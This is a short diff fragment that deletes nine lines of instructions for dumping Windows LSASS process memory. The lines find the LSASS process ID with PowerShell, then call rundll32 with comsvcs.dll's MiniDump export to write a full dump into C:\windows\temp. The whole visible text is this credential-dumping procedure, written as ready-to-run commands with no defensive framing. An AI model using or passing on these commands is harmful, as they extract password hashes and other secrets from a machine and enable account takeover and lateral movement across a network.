@@ -1,9 +1,0 @@
- * Find the LSASS PID:
-   Open PowerShell as Admin and run:
-   Get-Process lsass
-
-   Note the Id (e.g., 680).
- * Dump with Rundll32:
-   Run this command (replace 680 with the actual PID):
-   # Syntax: rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> <Output_File> full
-rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump 680 C:\windows\temp\lsass.dmp full
